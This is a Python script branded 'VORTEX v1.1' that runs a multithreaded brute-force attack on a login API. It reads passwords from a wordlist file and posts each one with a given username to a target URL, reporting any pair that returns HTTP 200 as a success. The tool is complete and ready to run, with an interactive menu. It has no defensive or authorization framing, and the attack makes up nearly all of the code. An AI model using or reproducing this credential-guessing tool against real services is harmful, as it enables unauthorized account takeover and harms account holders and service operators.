import requests
import json
import sys
from concurrent.futures import ThreadPoolExecutor

MAX_THREADS = 10 

def print_banner():
    GRN, BLU, RST = '\033[92m', '\033[94m', '\033[0m'
    banner = r"""
  _   _   ____  ____  _____  _   _  ____  
 ( )_( )(  _ \(  _ \(  _  )( \( )( ___)
  ) _ (  )   / )   / )(_)(  )  (  )__) 
 (_) (_)(_)\_)(_)\_)(_____)(_)\_)(____)
  VORTEX v1.1 // BY NEUROPRASS
    """
    print(BLU + banner + GRN + "\n [ Focus: Speed & Power ]" + RST)

def send_request(target_api, username, password):
    headers = {"Content-Type": "application/json"}
    payload = json.dumps({"username": username, "password": password})
    try:
        response = requests.post(target_api, headers=headers, data=payload, timeout=5)
        if response.status_code == 200:
            print(f"[+] SUCCESS: {username}:{password}")
            return True
    except Exception:
        pass
    return False

def execute_test(target_url, username, password_file):
    try:
        with open(password_file, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[-] Error: Password file not found.")
        return

    print(f"[*] Starting engine with {len(passwords)} keys using {MAX_THREADS} threads...")
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        for password in passwords:
            executor.submit(send_request, target_url, username, password)

def main():
    print_banner()
    while True:
        print("\n[ CORE MENU ]\n1. Analyze\n2. Run Test\n3. Exit")
        choice = input("\nvortex-auth > ")
        if choice == "1":
            url = input("[?] Target URL: ")
        elif choice == "2":
            url = input("[?] URL: ")
            user = input("[?] User: ")
            pfile = input("[?] Wordlist: ")
            execute_test(url, user, pfile)
        elif choice == "3":
            sys.exit()

if __name__ == "__main__":
    main()
